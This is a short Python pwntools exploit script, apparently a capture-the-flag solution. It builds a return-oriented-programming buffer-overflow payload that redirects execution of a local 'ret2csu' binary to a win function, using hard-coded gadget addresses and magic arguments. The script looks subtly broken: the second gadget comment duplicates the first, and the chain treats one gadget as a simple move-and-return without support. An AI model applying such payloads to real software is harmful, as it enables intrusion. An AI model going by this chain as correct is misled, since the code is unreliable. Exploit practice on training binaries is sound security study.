from pwn import *

p = process('./ret2csu')

# Gadget 1: Popping register values. __libc_csu_init @ 0x000000000040069a
#   0x000000000040069a <+90>:    pop    rbx
#   0x000000000040069b <+91>:    pop    rbp
#   0x000000000040069c <+92>:    pop    r12
#   0x000000000040069e <+94>:    pop    r13
#   0x00000000004006a0 <+96>:    pop    r14
#   0x00000000004006a2 <+98>:    pop    r15
#   0x00000000004006a4 <+100>:   ret   

# Gadget 2: Popping register values. __libc_csu_init @ 0x000000000040069a
#   0x000000000040069a <+90>:    pop    rbx
#   0x000000000040069b <+91>:    pop    rbp
#   0x000000000040069c <+92>:    pop    r12
#   0x000000000040069e <+94>:    pop    r13
#   0x00000000004006a0 <+96>:    pop    r14
#   0x00000000004006a2 <+98>:    pop    r15
#   0x00000000004006a4 <+100>:   ret   


win_call = p64(0x0000000000400510)
pop_rdi = p64(0x00000000004006a3)
pop_rsi_r15 = p64(0x00000000004006a1)
mov_rdx_r15 = p64(0x0000000000400680)
ret = p64(0x00000000004004e6)

arg1, arg2, arg3 = p64(0xdeadbeefdeadbeef), p64(0xcafebabecafebabe), p64(0xd00df00dd00df00d)

payload = b'A' * 32 + b'B' * 8
payload += pop_rdi
payload += arg1
payload += pop_rsi_r15
payload += arg2
payload += arg3
payload += mov_rdx_r15
payload += ret
payload += win_call

p.sendline(payload)
p.interactive()

